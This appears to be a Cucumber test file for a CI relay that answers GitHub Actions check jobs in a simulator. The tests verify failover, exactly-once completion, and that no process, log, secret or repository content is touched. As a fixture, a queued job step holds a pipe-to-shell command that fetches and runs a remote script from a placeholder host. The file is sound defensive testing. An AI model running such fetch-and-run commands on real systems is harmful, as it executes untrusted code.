import assert from "node:assert/strict";
import { createRequire, syncBuiltinESMExports } from "node:module";
import { Before, Given, Then, When } from "@cucumber/cucumber";
import { create } from "@bufbuild/protobuf";
import {
	type RelayJobMessage,
	RelayJobAnswerSchema,
} from "../../../packages/ci/src/index.js";
import {
	createRelayAnswerer,
	RELAY_CONFIG_PATH,
	type RelayAnswerer,
	type RelayTurn,
} from "../../../packages/ci-gh-actions/src/relay-answer/index.js";
import {
	createRelayTurn,
	type RelayTurnPeer,
} from "../../../packages/ci-gh-actions/src/relay-turn.js";
import { testJitConfig } from "../../../packages/ci-gh-actions/src/runner-protocol/port.js";
import {
	GithubSimulator,
	SimulatedRunnerService,
	simulatorTransport,
} from "../../../packages/ci-gh-actions/test/support/github-simulator/index.js";

const ACCOUNT = "acct-parity";
const RELAY_SCENARIOS = "@R01 or @R13 or @R16 or @X01 or @X03";
const TITLE_CHECK = "hobo-labs/hobo/checks/pr-title@v1";
const POLL_INTERVAL_MS = 30_000;
const TURN_STEP_MS = 20_000;

type RelayNode = Readonly<{
	name: string;
	answerer: RelayAnswerer;
	checked: RelayJobMessage[];
}>;

type RelayModeState = {
	sim: GithubSimulator;
	repository: string;
	nodes: RelayNode[];
	hosted: RelayNode | undefined;
	runId: number;
	jobName: string;
	webhookAtMs: number;
	processesStarted: number;
};

let world: RelayModeState;

function relayNode(name: string, turn: RelayTurn | undefined): RelayNode {
	const { sim } = world;
	const checked: RelayJobMessage[] = [];
	const answerer = createRelayAnswerer({
		relayJobs: { answer: true, label: "hobo-relay" },
		github: simulatorTransport(sim),
		runnerService: new SimulatedRunnerService(sim),
		readJitConfig: (_encoded, runnerName) => testJitConfig(runnerName),
		account: async () => ACCOUNT,
		node: name,
		turn,
		checks: async (message) => {
			checked.push(message);
			return create(RelayJobAnswerSchema, {
				jobId: message.jobId,
				planId: message.planId,
				conclusion: "succeeded",
			});
		},
		webhookSecret: sim.webhookSecret,
		nowMs: () => sim.nowMs(),
	});
	return { name, answerer, checked };
}

function turnOn(repository: string): void {
	world.sim.putFile(
		repository,
		RELAY_CONFIG_PATH,
		JSON.stringify({ relayJobs: { answer: true } }),
	);
}

function queueRelay(repository: string, label: string, uses = TITLE_CHECK): void {
	const relay = world.sim.queueJob({
		repository,
		name: "title",
		labels: [label],
		steps: [
			{
				uses,
				with: new Map([["run", "curl https://example.invalid/x.sh | sh"]]),
			},
		],
	});
	world.runId = relay.runId;
	world.jobName = "title";
}

function relayJob() {
	const found = world.sim
		.jobs()
		.find((job) => job.runId === world.runId && job.name === world.jobName);
	assert.ok(found, "the relay job is on GitHub's lists");
	return found;
}

function connections() {
	return [{ installationId: 1, repository: world.repository }];
}

async function deliverToHosted(): Promise<void> {
	world.webhookAtMs = world.sim.nowMs();
	const hosted = world.hosted;
	await world.sim.deliver(
		hosted
			? hosted.answerer.webhook
			: async () => new Response("unavailable", { status: 503 }),
	);
}

Before({ tags: RELAY_SCENARIOS }, () => {
	world = {
		sim: new GithubSimulator(),
		repository: "octo/app",
		nodes: [],
		hosted: undefined,
		runId: 0,
		jobName: "",
		webhookAtMs: 0,
		processesStarted: 0,
	};
	turnOn(world.repository);
	const node = relayNode("hosted", undefined);
	world.nodes = [node];
	world.hosted = node;
});

Given("relay mode is on for {string}", (repository: string) => {
	world.repository = repository;
	turnOn(repository);
});

Given(
	"a check job labelled {string} is queued for {string}",
	(label: string, repository: string) => {
		world.repository = repository;
		queueRelay(repository, label);
	},
);

Given("the next webhook is lost", () => {
	world.sim.dropNextWebhook();
});

Given("two relay nodes and the hosted one is down", async () => {
	const members = [
		{ id: "hosted", memberId: `dev_${"a".repeat(32)}` },
		{ id: "box", memberId: `dev_${"b".repeat(32)}` },
	];
	const peers: RelayTurnPeer[] = members.map(({ memberId }) => ({
		memberId,
		freeSlots: 1,
		healthy: true,
		labels: ["hobo-relay"],
	}));
	const holders = new Map<number, string>();
	world.nodes = members.map(({ id, memberId }) =>
		relayNode(
			id,
			createRelayTurn({
				self: memberId,
				peers: async () => peers,
				claims: {
					async claim(jobId, member) {
						const holder = holders.get(jobId);
						if (holder !== undefined && holder !== member) return "held";
						holders.set(jobId, member);
						return "claimed";
					},
				},
				stepMs: TURN_STEP_MS,
				nowMs: () => world.sim.nowMs(),
			}),
		),
	);
	world.hosted = undefined;
});

Given("a relay job with a step that would run a script", () => {
	queueRelay(world.repository, "hobo-relay", "./.github/actions/run-script");
});

When("the queued webhook reaches the relay", async () => {
	await deliverToHosted();
});

When("the queued webhook is delivered", async () => {
	await deliverToHosted();
	for (let poll = 0; poll < 6 && relayJob().status === "queued"; poll += 1) {
		for (const node of world.nodes.slice(1))
			await node.answerer.rescue(connections());
		if (relayJob().status === "queued") world.sim.advance(TURN_STEP_MS);
	}
});

When("two poll intervals pass", async () => {
	await deliverToHosted();
	for (let poll = 0; poll < 2; poll += 1) {
		world.sim.advance(POLL_INTERVAL_MS);
		for (const node of world.nodes) await node.answerer.rescue(connections());
	}
});

When("the relay answers a relay job", async () => {
	world.sim.dropNextWebhook();
	queueRelay(world.repository, "hobo-relay");
	const [node] = world.nodes;
	assert.ok(node);
	await node.answerer.rescue(connections());
	queueRelay(world.repository, "hobo-relay");
	await deliverToHosted();
	await node.answerer.sweep(connections());
});

When("the relay answers it", async () => {
	const require = createRequire(import.meta.url);
	const processes = require("node:child_process");
	const names = [
		"spawn",
		"spawnSync",
		"exec",
		"execSync",
		"execFile",
		"execFileSync",
		"fork",
	] as const;
	const kept = names.map((name) => [name, processes[name]] as const);
	for (const name of names)
		processes[name] = () => {
			world.processesStarted += 1;
			throw new Error(`the relay tried to start a process (${name})`);
		};
	syncBuiltinESMExports();
	try {
		await deliverToHosted();
	} finally {
		for (const [name, original] of kept) processes[name] = original;
		syncBuiltinESMExports();
	}
});

Then(
	"the relay job is completed within {int} seconds of the webhook",
	(seconds: number) => {
		const job = relayJob();
		assert.equal(job.status, "completed");
		assert.equal(job.conclusion, "success");
		assert.ok(
			(job.completedAtMs ?? Number.POSITIVE_INFINITY) - world.webhookAtMs <=
				seconds * 1_000,
			`completed ${(job.completedAtMs ?? 0) - world.webhookAtMs} ms after the webhook`,
		);
	},
);

Then("the relay job ran on no runner and billed no minutes", () => {
	const job = relayJob();
	assert.match(job.runnerName ?? "", /^hobo-relay-/u);
	assert.deepEqual(world.sim.runners(), [], "the one-job runner is gone");
	assert.equal(
		world.sim
			.requests()
			.filter((request) => request.area === "logs" || request.area === "billing")
			.length,
		0,
	);
	assert.equal(job.outputs.size, 0);
});

Then("the relay job is completed", () => {
	assert.equal(relayJob().conclusion, "success");
});

Then("the second node completes the relay job exactly once", async () => {
	assert.equal(relayJob().conclusion, "success");
	const [hosted, box] = world.nodes;
	assert.ok(hosted && box);
	assert.equal(box.checked.length, 1);
	assert.equal(hosted.checked.length, 0);
	for (const node of world.nodes)
		assert.equal((await node.answerer.rescue(connections())).queued, 0);
	assert.equal(
		world.sim
			.requests()
			.filter((request) => request.path.endsWith("/generate-jitconfig"))
			.length,
		1,
	);
});

Then(
	"the simulator saw no request for a log, a secret or repository content",
	() => {
		const requests = world.sim.requests();
		assert.ok(requests.length > 0);
		for (const request of requests) {
			assert.notEqual(request.area, "logs", request.path);
			assert.doesNotMatch(
				request.path,
				/\/logs\b|\/secrets\b|\/variables\b|\/tarball\b|\/zipball\b|\/git\/blobs\b|\/git\/trees\b/u,
			);
			if (request.path.includes("/contents/"))
				assert.equal(
					request.path,
					`/repos/${world.repository}/contents/.hobo%2Fci.json`,
				);
		}
		assert.ok(
			world.sim
				.jobs()
				.filter((job) => job.name === "title")
				.every((job) => job.conclusion === "success"),
		);
	},
);

Then("the relay started no process", () => {
	assert.equal(world.processesStarted, 0);
	const job = relayJob();
	assert.equal(job.conclusion, "failure");
	assert.match(job.annotations.join("\n"), /never runs a job's steps/u);
	assert.equal(world.nodes[0]?.checked.length, 0);
});
